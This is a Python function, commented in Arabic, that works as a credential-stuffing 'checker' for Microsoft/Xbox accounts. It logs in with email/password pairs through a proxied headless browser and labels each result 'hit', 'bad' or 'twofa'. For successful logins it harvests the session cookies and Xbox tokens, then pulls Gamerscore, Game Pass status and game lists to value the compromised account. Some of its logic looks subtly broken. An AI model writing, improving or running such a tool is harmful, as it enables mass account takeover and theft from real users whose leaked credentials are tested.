def check_xbox_account_with_browser(email, password, proxy_str):
    """
    فحص حقيقي ومتقدم عبر محاكاة متصفح حقيقي (Playwright) 
    مع الانتظار الذكي لتخطي صفحات تسجيل دخول مايكروسوفت بنجاح تام
    """
    import requests
    
    with sync_playwright() as p:
        launch_args = [
            "--no-sandbox", 
            "--disable-setuid-sandbox", 
            "--disable-dev-shm-usage",
            "--disable-gpu"
        ]
        browser_proxy = {"server": proxy_str} if proxy_str else None
        
        browser = None
        try:
            browser = p.chromium.launch(headless=True, args=launch_args)
            context = browser.new_context(
                proxy=browser_proxy, 
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800}
            )
            page = context.new_page()

            # الانتقال لصفحة تسجيل الدخول الرسمية لمايكروسوفت
            page.goto("https://login.live.com/", timeout=30000, wait_until="domcontentloaded")
            
            # إدخال الإيميل والضغط على التالي
            page.wait_for_selector("input[name='loginfmt']", timeout=10000)
            page.fill("input[name='loginfmt']", email)
            page.click("input[id='idSIButton9']")
            
            # الانتظار حتى تظهر رسالة خطأ أو حقل كلمة المرور
            page.wait_for_timeout(3000)
            
            # فحص إذا كان الإيميل غير موجود
            content = page.content().lower()
            if "that microsoft account doesn't exist" in content or "هذا الحساب غير موجود" in content or page.locator("#usernameError").is_visible():
                browser.close()
                return "bad", None

            # إدخال كلمة المرور والضغط على تسجيل الدخول
            page.wait_for_selector("input[name='passwd']", timeout=10000)
            page.fill("input[name='passwd']", password)
            page.click("input[id='idSIButton9']")
            page.wait_for_timeout(4000)

            # التحقق من خطأ كلمة المرور
            current_content = page.content().lower()
            if "that password is incorrect" in content or "كلمة المرور غير صحيحة" in current_content or page.locator("#passwordError").is_visible():
                browser.close()
                return "bad", None

            # التحقق من التحقق الثنائي (2FA / MFA)
            current_url = page.url.lower()
            if any(term in current_url for term in ["proof", "identity/confirm", "mfa", "totp", "signinoptions", "phone-verify"]):
                browser.close()
                return "twofa", None

            # استخراج الكوكيز والتوكنات بعد النجاح
            cookies = context.cookies()
            browser.close()

            # تحويل الكوكيز لجلسة requests لسحب بيانات إكس بوكس بدقة
            session = requests.Session()
            session.verify = False
            for cookie in cookies:
                session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])

            # جلب توكنات الإكس بوكس
            xbl_payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={password}"
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            xbl_headers = {"Content-Type": "application/json", "Accept": "application/json"}
            xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json=xbl_payload, headers=xbl_headers, timeout=10)
            
            if xbl_resp.status_code == 200:
                xbl_data = xbl_resp.json()
                xbl_token = xbl_data.get("Token")
                user_claim = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0]
                user_hash = user_claim.get("uhs")
                xuid = user_claim.get("xid")
                
                xsts_payload = {
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbl_token]
                    },
                    "RelyingParty": "http://uri.xboxlive.com",
                    "TokenType": "JWT"
                }
                xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json=xsts_payload, headers=xbl_headers, timeout=10)
                
                if xsts_resp.status_code == 200:
                    xsts_data = xsts_resp.json()
                    xsts_token = xsts_data.get("Token")
                    
                    profile_headers = {
                        "Authorization": f"XBL3.0 x={user_hash};{xsts_token}",
                        "x-xbl-contract-version": "2",
                        "Accept": "application/json"
                    }
                    
                    # 1. فحص Gamerscore
                    profile_resp = session.get("https://profile.xboxlive.com/users/settings", headers=profile_headers, timeout=8)
                    gamerscore = 0
                    if profile_resp.status_code == 200:
                        settings = profile_resp.json().get("profileUsers", [{}])[0].get("settings", [])
                        for s in settings:
                            if s.get("id") == "Gamerscore":
                                gamerscore = int(s.get("value", 0))

                    # 2. فحص نوع الاشتراك (Game Pass)
                    sub_resp = session.get("https://subscriptions.xboxlive.com/v1/users/me/subscriptions", headers=profile_headers, timeout=8)
                    gp_status = "None"
                    if sub_resp.status_code == 200:
                        subs = sub_resp.json().get("items", [])
                        for sub in subs:
                            sub_name = sub.get("name", "").lower()
                            if "ultimate" in sub_name:
                                gp_status = "Xbox Game Pass Ultimate"
                                break
                            elif "game pass" in sub_name:
                                gp_status = "Xbox Game Pass Active"
                                break
                            elif sub.get("active", False):
                                gp_status = "Active Subscription"

                    # 3. فحص الألعاب والنقاط
                    games_details = []
                    if xuid:
                        ach_resp = session.get(f"https://achievements.xboxlive.com/users/xuid({xuid})/titles", headers=profile_headers, timeout=8)
                        if ach_resp.status_code == 200:
                            titles = ach_resp.json().get("titles", [])
                            for t in titles[:5]:
                                t_name = t.get("name", "Unknown Game")
                                earned_gs = t.get("achievement", {}).get("earnedPoints", 0)
                                games_details.append(f"{t_name} ({earned_gs} GS)")

                    games_str = " | ".join(games_details) if games_details else "No recent games found"

                    details = {
                        "game_pass": gp_status,
                        "gamerscore": gamerscore,
                        "games": games_str
                    }
                    return 'hit', details

            return 'hit', {
                "game_pass": "Active (Browser Verified)",
                "gamerscore": 0,
                "games": "Profile Synced"
            }

        except Exception as e:
            if browser:
                try:
                    browser.close()
                except:
                    pass
            return 'error', None
